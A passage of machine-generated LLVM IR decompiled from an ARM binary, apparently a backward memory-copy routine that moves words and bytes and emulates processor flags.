  %v0_16d7c = phi i32 [ %v1_16d84, %dec_label_pc_16d78.dec_label_pc_16d78_crit_edge ], [ %v0_16d7c36, %dec_label_pc_16d6c ]
  %v0_16d78 = phi i32 [ %v0_16d78.pre, %dec_label_pc_16d78.dec_label_pc_16d78_crit_edge ], [ %v0_16d7835, %dec_label_pc_16d6c ]
  %v1_16d78 = add i32 %v0_16d78, -4
  %v2_16d78 = inttoptr i32 %v1_16d78 to i32*
  %v3_16d78 = load i32, i32* %v2_16d78, align 4
  %v4_16d78 = add i32 %v0_16d78, -8
  %v5_16d78 = inttoptr i32 %v4_16d78 to i32*
  %v6_16d78 = load i32, i32* %v5_16d78, align 4
  store i32 %v6_16d78, i32* %r4.global-to-local, align 4
  %v7_16d78 = add i32 %v0_16d78, -12
  %v8_16d78 = inttoptr i32 %v7_16d78 to i32*
  %v9_16d78 = load i32, i32* %v8_16d78, align 4
  store i32 %v9_16d78, i32* %ip.global-to-local, align 4
  %v10_16d78 = add i32 %v0_16d78, -16
  %v11_16d78 = inttoptr i32 %v10_16d78 to i32*
  %v12_16d78 = load i32, i32* %v11_16d78, align 4
  store i32 %v12_16d78, i32* %lr.global-to-local, align 4
  store i32 %v10_16d78, i32* %r1.global-to-local, align 4
  %v1_16d7c = add i32 %v0_16d7c, -16
  %v2_16d7c = inttoptr i32 %v1_16d7c to i32*
  store i32 %v3_16d78, i32* %v2_16d7c, align 4
  %v4_16d7c = add i32 %v0_16d7c, -12
  %v5_16d7c = inttoptr i32 %v4_16d7c to i32*
  %v6_16d7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16d7c, i32* %v5_16d7c, align 4
  %v7_16d7c = add i32 %v0_16d7c, -8
  %v8_16d7c = inttoptr i32 %v7_16d7c to i32*
  %v9_16d7c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_16d7c, i32* %v8_16d7c, align 4
  %v10_16d7c = add i32 %v0_16d7c, -4
  %v11_16d7c = inttoptr i32 %v10_16d7c to i32*
  %v12_16d7c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16d7c, i32* %v11_16d7c, align 4
  store i32 %v1_16d7c, i32* %r0.global-to-local, align 4
  %v0_16d80 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d80 = add i32 %v0_16d80, -4
  %v2_16d80 = inttoptr i32 %v1_16d80 to i32*
  %v3_16d80 = load i32, i32* %v2_16d80, align 4
  store i32 %v3_16d80, i32* @r3, align 4
  %v4_16d80 = add i32 %v0_16d80, -8
  %v5_16d80 = inttoptr i32 %v4_16d80 to i32*
  %v6_16d80 = load i32, i32* %v5_16d80, align 4
  store i32 %v6_16d80, i32* %r4.global-to-local, align 4
  %v7_16d80 = add i32 %v0_16d80, -12
  %v8_16d80 = inttoptr i32 %v7_16d80 to i32*
  %v9_16d80 = load i32, i32* %v8_16d80, align 4
  store i32 %v9_16d80, i32* @ip, align 4
  %v10_16d80 = add i32 %v0_16d80, -16
  %v11_16d80 = inttoptr i32 %v10_16d80 to i32*
  %v12_16d80 = load i32, i32* %v11_16d80, align 4
  store i32 %v12_16d80, i32* %lr.global-to-local, align 4
  store i32 %v10_16d80, i32* %r1.global-to-local, align 4
  %v1_16d84 = add i32 %v0_16d7c, -32
  %v2_16d84 = inttoptr i32 %v1_16d84 to i32*
  store i32 %v3_16d80, i32* %v2_16d84, align 4
  %v4_16d84 = add i32 %v0_16d7c, -28
  %v5_16d84 = inttoptr i32 %v4_16d84 to i32*
  %v6_16d84 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16d84, i32* %v5_16d84, align 4
  %v7_16d84 = add i32 %v0_16d7c, -24
  %v8_16d84 = inttoptr i32 %v7_16d84 to i32*
  %v9_16d84 = load i32, i32* @ip, align 4
  store i32 %v9_16d84, i32* %v8_16d84, align 4
  %v10_16d84 = add i32 %v0_16d7c, -20
  %v11_16d84 = inttoptr i32 %v10_16d84 to i32*
  %v12_16d84 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16d84, i32* %v11_16d84, align 4
  store i32 %v1_16d84, i32* %r0.global-to-local, align 4
  %v0_16d88 = load i32, i32* %r2.global-to-local, align 4
  %v2_16d88 = add i32 %v0_16d88, -32
  store i32 %v2_16d88, i32* %r2.global-to-local, align 4
  %v6_16d8c = icmp slt i32 %v0_16d88, 32
  br i1 %v6_16d8c, label %dec_label_pc_16d90.loopexit, label %dec_label_pc_16d78.dec_label_pc_16d78_crit_edge

dec_label_pc_16d78.dec_label_pc_16d78_crit_edge:  ; preds = %dec_label_pc_16d78
  %v0_16d78.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16d78

dec_label_pc_16d90.loopexit:                      ; preds = %dec_label_pc_16d78
  %v4_16d88 = sub i32 31, %v0_16d88
  %v5_16d88 = and i32 %v4_16d88, %v0_16d88
  %v6_16d88 = icmp slt i32 %v5_16d88, 0
  %v7_16d88 = icmp slt i32 %v2_16d88, 0
  store i1 %v6_16d88, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16d88, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16d90

dec_label_pc_16d90:                               ; preds = %dec_label_pc_16d90.loopexit, %dec_label_pc_16d6c
  %v6_16d98 = phi i32 [ %v1_16d84, %dec_label_pc_16d90.loopexit ], [ %v0_16d7c36, %dec_label_pc_16d6c ]
  %v0_16da0.pr = phi i32 [ %v2_16d88, %dec_label_pc_16d90.loopexit ], [ %v2_16d70, %dec_label_pc_16d6c ]
  %v4_16d90 = add i32 %v0_16da0.pr, 16
  %v6_16d90 = sub i32 0, %v0_16da0.pr
  %v7_16d90 = and i32 %v4_16d90, %v6_16d90
  %v8_16d90 = icmp slt i32 %v7_16d90, 0
  store i1 %v8_16d90, i1* %cpsr_v.global-to-local, align 1
  %v9_16d90 = icmp slt i32 %v4_16d90, 0
  store i1 %v9_16d90, i1* %cpsr_n.global-to-local, align 1
  %v10_16d90 = icmp eq i32 %v4_16d90, 0
  store i1 %v10_16d90, i1* %cpsr_z.global-to-local, align 1
  %v5_16d94 = icmp slt i32 %v0_16da0.pr, -16
  br i1 %v5_16d94, label %.thread1, label %bb147

bb147:                                            ; preds = %dec_label_pc_16d90
  %v6_16d94 = load i32, i32* %r1.global-to-local, align 4
  %v7_16d94 = add i32 %v6_16d94, -4
  %v8_16d94 = inttoptr i32 %v7_16d94 to i32*
  %v9_16d94 = load i32, i32* %v8_16d94, align 4
  store i32 %v9_16d94, i32* @r3, align 4
  %v10_16d94 = add i32 %v6_16d94, -8
  %v11_16d94 = inttoptr i32 %v10_16d94 to i32*
  %v12_16d94 = load i32, i32* %v11_16d94, align 4
  store i32 %v12_16d94, i32* %r4.global-to-local, align 4
  %v13_16d94 = add i32 %v6_16d94, -12
  %v14_16d94 = inttoptr i32 %v13_16d94 to i32*
  %v15_16d94 = load i32, i32* %v14_16d94, align 4
  store i32 %v15_16d94, i32* @ip, align 4
  %v16_16d94 = add i32 %v6_16d94, -16
  %v17_16d94 = inttoptr i32 %v16_16d94 to i32*
  %v18_16d94 = load i32, i32* %v17_16d94, align 4
  store i32 %v18_16d94, i32* %lr.global-to-local, align 4
  store i32 %v16_16d94, i32* %r1.global-to-local, align 4
  %v7_16d98 = add i32 %v6_16d98, -16
  %v8_16d98 = inttoptr i32 %v7_16d98 to i32*
  store i32 %v9_16d94, i32* %v8_16d98, align 4
  %v10_16d98 = add i32 %v6_16d98, -12
  %v11_16d98 = inttoptr i32 %v10_16d98 to i32*
  %v12_16d98 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_16d98, i32* %v11_16d98, align 4
  %v13_16d98 = add i32 %v6_16d98, -8
  %v14_16d98 = inttoptr i32 %v13_16d98 to i32*
  %v15_16d98 = load i32, i32* @ip, align 4
  store i32 %v15_16d98, i32* %v14_16d98, align 4
  %v16_16d98 = add i32 %v6_16d98, -4
  %v17_16d98 = inttoptr i32 %v16_16d98 to i32*
  %v18_16d98 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_16d98, i32* %v17_16d98, align 4
  store i32 %v7_16d98, i32* %r0.global-to-local, align 4
  %v6_16d9c = load i32, i32* %r2.global-to-local, align 4
  %v7_16d9c = add i32 %v6_16d9c, -16
  store i32 %v7_16d9c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16d90, %bb147
  %v6_16da8 = phi i32 [ %v7_16d98, %bb147 ], [ %v6_16d98, %dec_label_pc_16d90 ]
  %v0_16da0 = phi i32 [ %v7_16d9c, %bb147 ], [ %v0_16da0.pr, %dec_label_pc_16d90 ]
  %v4_16da0 = add i32 %v0_16da0, 20
  store i32 %v4_16da0, i32* %r2.global-to-local, align 4
  %v6_16da0 = sub i32 0, %v0_16da0
  %v7_16da0 = and i32 %v4_16da0, %v6_16da0
  %v8_16da0 = icmp slt i32 %v7_16da0, 0
  store i1 %v8_16da0, i1* %cpsr_v.global-to-local, align 1
  %v9_16da0 = icmp slt i32 %v4_16da0, 0
  store i1 %v9_16da0, i1* %cpsr_n.global-to-local, align 1
  %v10_16da0 = icmp eq i32 %v4_16da0, 0
  store i1 %v10_16da0, i1* %cpsr_z.global-to-local, align 1
  %v5_16da4 = icmp slt i32 %v0_16da0, -20
  br i1 %v5_16da4, label %.thread3, label %bb148

bb148:                                            ; preds = %.thread1
  %v6_16da4 = load i32, i32* %r1.global-to-local, align 4
  %v7_16da4 = add i32 %v6_16da4, -4
  %v8_16da4 = inttoptr i32 %v7_16da4 to i32*
  %v9_16da4 = load i32, i32* %v8_16da4, align 4
  store i32 %v9_16da4, i32* @r3, align 4
  %v10_16da4 = add i32 %v6_16da4, -8
  %v11_16da4 = inttoptr i32 %v10_16da4 to i32*
  %v12_16da4 = load i32, i32* %v11_16da4, align 4
  store i32 %v12_16da4, i32* @ip, align 4
  %v13_16da4 = add i32 %v6_16da4, -12
  %v14_16da4 = inttoptr i32 %v13_16da4 to i32*
  %v15_16da4 = load i32, i32* %v14_16da4, align 4
  store i32 %v15_16da4, i32* %lr.global-to-local, align 4
  store i32 %v13_16da4, i32* %r1.global-to-local, align 4
  %v7_16da8 = add i32 %v6_16da8, -12
  %v8_16da8 = inttoptr i32 %v7_16da8 to i32*
  store i32 %v9_16da4, i32* %v8_16da8, align 4
  %v10_16da8 = add i32 %v6_16da8, -8
  %v11_16da8 = inttoptr i32 %v10_16da8 to i32*
  %v12_16da8 = load i32, i32* @ip, align 4
  store i32 %v12_16da8, i32* %v11_16da8, align 4
  %v13_16da8 = add i32 %v6_16da8, -4
  %v14_16da8 = inttoptr i32 %v13_16da8 to i32*
  %v15_16da8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_16da8, i32* %v14_16da8, align 4
  store i32 %v7_16da8, i32* %r0.global-to-local, align 4
  %v6_16dac = load i32, i32* %r2.global-to-local, align 4
  %v7_16dac = add i32 %v6_16dac, -12
  store i32 %v7_16dac, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb148
  %v6_16dcc44 = phi i32 [ %v6_16da8, %.thread1 ], [ %v7_16da8, %bb148 ]
  %v0_16db442 = phi i32 [ %v4_16da0, %.thread1 ], [ %v7_16dac, %bb148 ]
  %v2_16db0 = load i8*, i8** %stack_var_-8, align 4
  %v3_16db0 = ptrtoint i8* %v2_16db0 to i32
  store i32 %v3_16db0, i32* @r4, align 4
  store i32 %v8_16d6c, i32* @lr, align 4
  br label %dec_label_pc_16db4

dec_label_pc_16db4:                               ; preds = %dec_label_pc_16d64, %.thread3
  %v7_16dc4 = phi i32 [ %v0_16d7c36, %dec_label_pc_16d64 ], [ %v6_16dcc44, %.thread3 ]
  %v0_16db4 = phi i32 [ %v2_16d64, %dec_label_pc_16d64 ], [ %v0_16db442, %.thread3 ]
  %v2_16db4 = add i32 %v0_16db4, 8
  store i32 %v2_16db4, i32* %r2.global-to-local, align 4
  %v4_16db4 = sub i32 0, %v0_16db4
  %v5_16db4 = and i32 %v2_16db4, %v4_16db4
  %v6_16db4 = icmp slt i32 %v5_16db4, 0
  store i1 %v6_16db4, i1* %cpsr_v.global-to-local, align 1
  %v7_16db4 = icmp slt i32 %v2_16db4, 0
  store i1 %v7_16db4, i1* %cpsr_n.global-to-local, align 1
  %v8_16db4 = icmp eq i32 %v2_16db4, 0
  store i1 %v8_16db4, i1* %cpsr_z.global-to-local, align 1
  %v5_16db8 = icmp slt i32 %v0_16db4, -8
  br i1 %v5_16db8, label %bb150, label %dec_label_pc_16dbc

dec_label_pc_16dbc:                               ; preds = %dec_label_pc_16db4
  %v6_16dbc = add i32 %v0_16db4, 4
  store i32 %v6_16dbc, i32* %r2.global-to-local, align 4
  %v8_16dbc = sub i32 -5, %v0_16db4
  %v9_16dbc = and i32 %v8_16dbc, %v2_16db4
  %v10_16dbc = icmp slt i32 %v9_16dbc, 0
  store i1 %v10_16dbc, i1* %cpsr_v.global-to-local, align 1
  %v11_16dbc = icmp slt i32 %v6_16dbc, 0
  store i1 %v11_16dbc, i1* %cpsr_n.global-to-local, align 1
  %v12_16dbc = icmp eq i32 %v2_16db4, 4
  store i1 %v12_16dbc, i1* %cpsr_z.global-to-local, align 1
  %v5_16dc0 = icmp slt i32 %v2_16db4, 4
  %v6_16dc0 = load i32, i32* %r1.global-to-local, align 4
  %v7_16dc0 = add i32 %v6_16dc0, -4
  %v8_16dc0 = inttoptr i32 %v7_16dc0 to i32*
  %v9_16dc0 = load i32, i32* %v8_16dc0, align 4
  store i32 %v9_16dc0, i32* @r3, align 4
  br i1 %v5_16dc0, label %.thread7, label %bb149

.thread7:                                         ; preds = %dec_label_pc_16dbc
  store i32 %v7_16dc0, i32* %r1.global-to-local, align 4
  %v8_16dc4 = add i32 %v7_16dc4, -4
  %v9_16dc4 = inttoptr i32 %v8_16dc4 to i32*
  store i32 %v9_16dc0, i32* %v9_16dc4, align 4
  %v10_16dc4 = load i32, i32* %r0.global-to-local, align 4
  %v11_16dc4 = add i32 %v10_16dc4, -4
  store i32 %v11_16dc4, i32* %r0.global-to-local, align 4
  %v0_16dd4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_16dbc
  %v10_16dc8 = add i32 %v6_16dc0, -8
  %v11_16dc8 = inttoptr i32 %v10_16dc8 to i32*
  %v12_16dc8 = load i32, i32* %v11_16dc8, align 4
  store i32 %v12_16dc8, i32* @ip, align 4
  store i32 %v10_16dc8, i32* %r1.global-to-local, align 4
  %v7_16dcc = add i32 %v7_16dc4, -8
  %v8_16dcc = inttoptr i32 %v7_16dcc to i32*
  store i32 %v9_16dc0, i32* %v8_16dcc, align 4
  %v10_16dcc = add i32 %v7_16dc4, -4
  %v11_16dcc = inttoptr i32 %v10_16dcc to i32*
  %v12_16dcc = load i32, i32* @ip, align 4
  store i32 %v12_16dcc, i32* %v11_16dcc, align 4
  store i32 %v7_16dcc, i32* %r0.global-to-local, align 4
  %v6_16dd0 = load i32, i32* %r2.global-to-local, align 4
  %v7_16dd0 = add i32 %v6_16dd0, -4
  store i32 %v7_16dd0, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread7, %dec_label_pc_16db4, %dec_label_pc_16d44, %.thread13, %dec_label_pc_16f78, %dec_label_pc_16f0c, %dec_label_pc_16ea0, %bb149
  %v2_16dd8 = phi i32 [ %v11_16dc4, %.thread7 ], [ %v7_16dc4, %dec_label_pc_16db4 ], [ %v2_16d48, %dec_label_pc_16d44 ], [ %v0_16e7019, %.thread13 ], [ %v2_16de452, %dec_label_pc_16f78 ], [ %v2_16de451, %dec_label_pc_16f0c ], [ %v2_16de450, %dec_label_pc_16ea0 ], [ %v7_16dcc, %bb149 ]
  %v0_16dd4 = phi i32 [ %v0_16dd4.pre, %.thread7 ], [ %v2_16db4, %dec_label_pc_16db4 ], [ %v2_16d4c, %dec_label_pc_16d44 ], [ %v2_16e18, %.thread13 ], [ %v0_16dd448, %dec_label_pc_16f78 ], [ %v0_16dd447, %dec_label_pc_16f0c ], [ %v0_16dd446, %dec_label_pc_16ea0 ], [ %v7_16dd0, %bb149 ]
  %v1_16dd4 = add i32 %v0_16dd4, 4
  store i32 %v1_16dd4, i32* @r2, align 4
  %v3_16dd4 = sub i32 0, %v0_16dd4
  %v4_16dd4 = and i32 %v1_16dd4, %v3_16dd4
  %v5_16dd4 = icmp slt i32 %v4_16dd4, 0
  store i1 %v5_16dd4, i1* %cpsr_v.global-to-local, align 1
  %v6_16dd4 = icmp slt i32 %v1_16dd4, 0
  store i1 %v6_16dd4, i1* %cpsr_n.global-to-local, align 1
  %v7_16dd4 = icmp eq i32 %v1_16dd4, 0
  store i1 %v7_16dd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16dd4, label %.thread129, label %bb151

bb151:                                            ; preds = %bb150
  %v1_16ddc = add i32 %v0_16dd4, 2
  %v3_16ddc = sub i32 -3, %v0_16dd4
  %v4_16ddc = and i32 %v3_16ddc, %v1_16dd4
  %v5_16ddc = icmp slt i32 %v4_16ddc, 0
  store i1 %v5_16ddc, i1* %cpsr_v.global-to-local, align 1
  %v6_16ddc = icmp slt i32 %v1_16ddc, 0
  store i1 %v6_16ddc, i1* %cpsr_n.global-to-local, align 1
  %v7_16ddc = icmp eq i32 %v1_16dd4, 2
  store i1 %v7_16ddc, i1* %cpsr_z.global-to-local, align 1
  %v0_16de0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16de0 = add i32 %v0_16de0, -1
  %v2_16de0 = inttoptr i32 %v1_16de0 to i8*
  %v3_16de0 = load i8, i8* %v2_16de0, align 1
  %v4_16de0 = zext i8 %v3_16de0 to i32
  store i32 %v4_16de0, i32* @r3, align 4
  store i32 %v1_16de0, i32* %r1.global-to-local, align 4
  %v3_16de4 = add i32 %v2_16dd8, -1
  %v4_16de4 = inttoptr i32 %v3_16de4 to i8*
  store i8 %v3_16de0, i8* %v4_16de4, align 1
  %v5_16de4 = load i32, i32* %r0.global-to-local, align 4
  %v6_16de4 = add i32 %v5_16de4, -1
  store i32 %v6_16de4, i32* %r0.global-to-local, align 4
  %v0_16de8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16de8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16de8 = xor i1 %v0_16de8, %v1_16de8
  br i1 %v2_16de8, label %.thread128, label %bb152

bb152:                                            ; preds = %bb151
  %v3_16de8 = load i32, i32* %r1.global-to-local, align 4
  %v4_16de8 = add i32 %v3_16de8, -1
  %v5_16de8 = inttoptr i32 %v4_16de8 to i8*
  %v6_16de8 = load i8, i8* %v5_16de8, align 1
  %v7_16de8 = zext i8 %v6_16de8 to i32
  store i32 %v7_16de8, i32* @r3, align 4
  store i32 %v4_16de8, i32* %r1.global-to-local, align 4
  %v6_16dec = add i32 %v5_16de4, -2
  %v7_16dec = inttoptr i32 %v6_16dec to i8*
  store i8 %v6_16de8, i8* %v7_16dec, align 1
  %v8_16dec = load i32, i32* %r0.global-to-local, align 4
  %v9_16dec = add i32 %v8_16dec, -1
  store i32 %v9_16dec, i32* %r0.global-to-local, align 4
  %v1_16df0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16df0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread128

.thread128:                                       ; preds = %bb151, %bb152
  %v7_16df4 = phi i32 [ %v9_16dec, %bb152 ], [ %v6_16de4, %bb151 ]
  %v2_16df4 = phi i1 [ %v2_16df0.pre, %bb152 ], [ %v1_16de8, %bb151 ]
  %v1_16df4 = phi i1 [ %v1_16df0.pre, %bb152 ], [ %v0_16de8, %bb151 ]
  %v0_16df0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16df0 = xor i1 %v2_16df4, %v1_16df4
  %v4_16df0 = or i1 %v0_16df0, %v3_16df0
  br i1 %v4_16df0, label %.thread129, label %bb153

bb153:                                            ; preds = %.thread128
  %v5_16df0 = load i32, i32* %r1.global-to-local, align 4
  %v6_16df0 = add i32 %v5_16df0, -1
  %v7_16df0 = inttoptr i32 %v6_16df0 to i8*
  %v8_16df0 = load i8, i8* %v7_16df0, align 1
  %v9_16df0 = zext i8 %v8_16df0 to i32
  store i32 %v9_16df0, i32* @r3, align 4
  store i32 %v6_16df0, i32* %r1.global-to-local, align 4
  %v8_16df4 = add i32 %v7_16df4, -1
  %v9_16df4 = inttoptr i32 %v8_16df4 to i8*
  store i8 %v8_16df0, i8* %v9_16df4, align 1
  %v10_16df4 = load i32, i32* %r0.global-to-local, align 4
  %v11_16df4 = add i32 %v10_16df4, -1
  store i32 %v11_16df4, i32* %r0.global-to-local, align 4
  br label %.thread129

dec_label_pc_16dfc:                               ; preds = %dec_label_pc_16d54
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_16dfc = icmp eq i32 %v1_16d54, 1
  store i1 %v8_16dfc, i1* %cpsr_n.global-to-local, align 1
  %v9_16dfc = icmp eq i32 %v1_16d54, 2
  store i1 %v9_16dfc, i1* %cpsr_z.global-to-local, align 1
  %v1_16e00 = add i32 %v2_16d44, -1
  %v2_16e00 = inttoptr i32 %v1_16e00 to i8*
  %v3_16e00 = load i8, i8* %v2_16e00, align 1
  %v4_16e00 = zext i8 %v3_16e00 to i32
  store i32 %v4_16e00, i32* @r3, align 4
  store i32 %v1_16e00, i32* %r1.global-to-local, align 4
  %v3_16e04 = add i32 %v2_16d48, -1
  %v4_16e04 = inttoptr i32 %v3_16e04 to i8*
  store i8 %v3_16e00, i8* %v4_16e04, align 1
  %v5_16e04 = load i32, i32* %r0.global-to-local, align 4
  %v6_16e04 = add i32 %v5_16e04, -1
  store i32 %v6_16e04, i32* %r0.global-to-local, align 4
  br i1 %v8_16dfc, label %.thread13, label %bb154

bb154:                                            ; preds = %dec_label_pc_16dfc
  %v6_16e08 = load i32, i32* %r1.global-to-local, align 4
  %v7_16e08 = add i32 %v6_16e08, -1
  %v8_16e08 = inttoptr i32 %v7_16e08 to i8*
  %v9_16e08 = load i8, i8* %v8_16e08, align 1
  %v10_16e08 = zext i8 %v9_16e08 to i32
  store i32 %v10_16e08, i32* @r3, align 4
  store i32 %v7_16e08, i32* %r1.global-to-local, align 4
  %v9_16e0c = add i32 %v5_16e04, -2
  %v10_16e0c = inttoptr i32 %v9_16e0c to i8*
  store i8 %v9_16e08, i8* %v10_16e0c, align 1
  %v11_16e0c = load i32, i32* %r0.global-to-local, align 4
  %v12_16e0c = add i32 %v11_16e0c, -1
  store i32 %v12_16e0c, i32* %r0.global-to-local, align 4
  br i1 %v9_16dfc, label %.thread13, label %bb155

bb155:                                            ; preds = %bb154
  %v8_16e10 = load i32, i32* %r1.global-to-local, align 4
  %v9_16e10 = add i32 %v8_16e10, -1
  %v10_16e10 = inttoptr i32 %v9_16e10 to i8*
  %v11_16e10 = load i8, i8* %v10_16e10, align 1
  %v12_16e10 = zext i8 %v11_16e10 to i32
  store i32 %v12_16e10, i32* @r3, align 4
  store i32 %v9_16e10, i32* %r1.global-to-local, align 4
  %v11_16e14 = add i32 %v11_16e0c, -2
  %v12_16e14 = inttoptr i32 %v11_16e14 to i8*
  store i8 %v11_16e10, i8* %v12_16e14, align 1
  %v13_16e14 = load i32, i32* %r0.global-to-local, align 4
  %v14_16e14 = add i32 %v13_16e14, -1
  store i32 %v14_16e14, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb154, %dec_label_pc_16dfc, %bb155
  %v0_16e7019 = phi i32 [ %v12_16e0c, %bb154 ], [ %v6_16e04, %dec_label_pc_16dfc ], [ %v14_16e14, %bb155 ]
  %v0_16e18 = load i32, i32* %r2.global-to-local, align 4
  %v1_16e18 = load i32, i32* @ip, align 4
  %v2_16e18 = sub i32 %v0_16e18, %v1_16e18
  store i32 %v2_16e18, i32* %r2.global-to-local, align 4
  %v4_16e18 = xor i32 %v1_16e18, %v0_16e18
  %v5_16e18 = xor i32 %v2_16e18, %v0_16e18
  %v6_16e18 = and i32 %v5_16e18, %v4_16e18
  %v7_16e18 = icmp slt i32 %v6_16e18, 0
  store i1 %v7_16e18, i1* %cpsr_v.global-to-local, align 1
  %v8_16e18 = icmp slt i32 %v2_16e18, 0
  store i1 %v8_16e18, i1* %cpsr_n.global-to-local, align 1
  %v9_16e18 = icmp eq i32 %v0_16e18, %v1_16e18
  store i1 %v9_16e18, i1* %cpsr_z.global-to-local, align 1
  %v5_16e1c = icmp slt i32 %v0_16e18, %v1_16e18
  br i1 %v5_16e1c, label %bb150, label %dec_label_pc_16e20

dec_label_pc_16e20:                               ; preds = %.thread13
  %v0_16e20 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e20 = urem i32 %v0_16e20, 4
  store i32 %v1_16e20, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16e20 = icmp eq i32 %v1_16e20, 0
  store i1 %v2_16e20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16e20, label %dec_label_pc_16d64, label %dec_label_pc_16e28

dec_label_pc_16e28:                               ; preds = %dec_label_pc_16d5c, %dec_label_pc_16e20
  %v0_16e7018 = phi i32 [ %v2_16d48, %dec_label_pc_16d5c ], [ %v0_16e7019, %dec_label_pc_16e20 ]
  %v0_16f1c = phi i32 [ %v2_16d4c, %dec_label_pc_16d5c ], [ %v2_16e18, %dec_label_pc_16e20 ]
  %v0_16e28 = phi i32 [ %v2_16d44, %dec_label_pc_16d5c ], [ %v0_16e20, %dec_label_pc_16e20 ]
  %v0_16e30 = phi i32 [ %v1_16d5c, %dec_label_pc_16d5c ], [ %v1_16e20, %dec_label_pc_16e20 ]
  %v1_16e28 = and i32 %v0_16e28, -4
  store i32 %v1_16e28, i32* %r1.global-to-local, align 4
  %v1_16e2c = inttoptr i32 %v1_16e28 to i32*
  %v2_16e2c = load i32, i32* %v1_16e2c, align 4
  store i32 %v2_16e2c, i32* @r3, align 4
  %v7_16e30 = icmp ult i32 %v0_16e30, 2
  %v2_16f14 = add i32 %v0_16f1c, -12
  %v4_16f14 = sub i32 11, %v0_16f1c
  %v5_16f14 = and i32 %v4_16f14, %v0_16f1c
  %v6_16f14 = icmp slt i32 %v5_16f14, 0
  store i1 %v6_16f14, i1* %cpsr_v.global-to-local, align 1
  %v7_16f14 = icmp slt i32 %v2_16f14, 0
  store i1 %v7_16f14, i1* %cpsr_n.global-to-local, align 1
  %v8_16f14 = icmp eq i32 %v0_16f1c, 12
  store i1 %v8_16f14, i1* %cpsr_z.global-to-local, align 1
  %v5_16f18 = icmp slt i32 %v0_16f1c, 12
  br i1 %v7_16e30, label %dec_label_pc_16f14, label %dec_label_pc_16e38

dec_label_pc_16e38:                               ; preds = %dec_label_pc_16e28
  %v8_16e30 = icmp eq i32 %v0_16e30, 2
  br i1 %v8_16e30, label %dec_label_pc_16ea8, label %dec_label_pc_16e3c

dec_label_pc_16e3c:                               ; preds = %dec_label_pc_16e38
  br i1 %v5_16f18, label %dec_label_pc_16e88, label %dec_label_pc_16e44

dec_label_pc_16e44:                               ; preds = %dec_label_pc_16e3c
  store i32 %v2_16f14, i32* %r2.global-to-local, align 4
  %v3_16e48 = load i32, i32* @r4, align 4
  store i32 %v3_16e48, i32* %stack_var_-12, align 4
  %v6_16e48 = load i32, i32* @r5, align 4
  %v8_16e48 = inttoptr i32 %v6_16e48 to i8*
  store i8* %v8_16e48, i8** %stack_var_-8, align 4
  %v11_16e48 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16e4c

dec_label_pc_16e4c:                               ; preds = %dec_label_pc_16e4c.dec_label_pc_16e4c_crit_edge, %dec_label_pc_16e44
  %v0_16e70 = phi i32 [ %v1_16e70, %dec_label_pc_16e4c.dec_label_pc_16e4c_crit_edge ], [ %v0_16e7018, %dec_label_pc_16e44 ]
  %v0_16e50 = phi i32 [ %v0_16e50.pre, %dec_label_pc_16e4c.dec_label_pc_16e4c_crit_edge ], [ %v1_16e28, %dec_label_pc_16e44 ]
  %v0_16e4c = phi i32 [ %v0_16e4c.pre, %dec_label_pc_16e4c.dec_label_pc_16e4c_crit_edge ], [ %v2_16e2c, %dec_label_pc_16e44 ]
  %v3_16e4c = mul i32 %v0_16e4c, 256
  store i32 %v3_16e4c, i32* %lr.global-to-local, align 4
  %v1_16e50 = add i32 %v0_16e50, -4
  %v2_16e50 = inttoptr i32 %v1_16e50 to i32*
  %v3_16e50 = load i32, i32* %v2_16e50, align 4
  store i32 %v3_16e50, i32* @r3, align 4
  %v4_16e50 = add i32 %v0_16e50, -8
  %v5_16e50 = inttoptr i32 %v4_16e50 to i32*
  %v6_16e50 = load i32, i32* %v5_16e50, align 4
  store i32 %v6_16e50, i32* %r4.global-to-local, align 4
  %v7_16e50 = add i32 %v0_16e50, -12
  %v8_16e50 = inttoptr i32 %v7_16e50 to i32*
  %v9_16e50 = load i32, i32* %v8_16e50, align 4
  store i32 %v9_16e50, i32* %r5.global-to-local, align 4
  %v10_16e50 = add i32 %v0_16e50, -16
  %v11_16e50 = inttoptr i32 %v10_16e50 to i32*
  %v12_16e50 = load i32, i32* %v11_16e50, align 4
  store i32 %v10_16e50, i32* %r1.global-to-local, align 4
  %v4_16e54 = udiv i32 %v12_16e50, 16777216
  %v5_16e54 = or i32 %v4_16e54, %v3_16e4c
  store i32 %v5_16e54, i32* %lr.global-to-local, align 4
  %v3_16e58 = mul i32 %v12_16e50, 256
  %v4_16e5c = udiv i32 %v9_16e50, 16777216
  %v5_16e5c = or i32 %v3_16e58, %v4_16e5c
  store i32 %v5_16e5c, i32* @ip, align 4
  %v3_16e60 = mul i32 %v9_16e50, 256
  %v4_16e64 = udiv i32 %v6_16e50, 16777216
